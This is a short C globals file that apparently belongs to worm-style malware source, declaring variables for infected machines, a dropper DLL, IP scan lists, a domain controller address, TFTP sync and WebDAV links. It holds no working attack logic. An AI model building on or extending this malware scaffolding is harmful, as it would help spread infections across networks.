#include "main.h"
#include "globals.h"

DWORD					local_threads[MAX_LOCAL_THREADS];
UINT					local_thread_counter;

DWORD					dc_address;

PDWORD					ip_address_list;

BOOL					zero_used_ip_list;

PDWORD					infected_machines;

BOOL					dropper_dll;

LPVOID					dll_image;

CRITICAL_SECTION		husk_tftp_sync;

PWRAPPER_INFECT_LOG		first_wrapper_log			= NULL;

GLOBAL_CONFIGURATION	global_config;

CRITICAL_SECTION		scan_buffer_lock;

PCHAR					webdav_links[1024]			= {0};
UINT					webdav_link_index			= 0;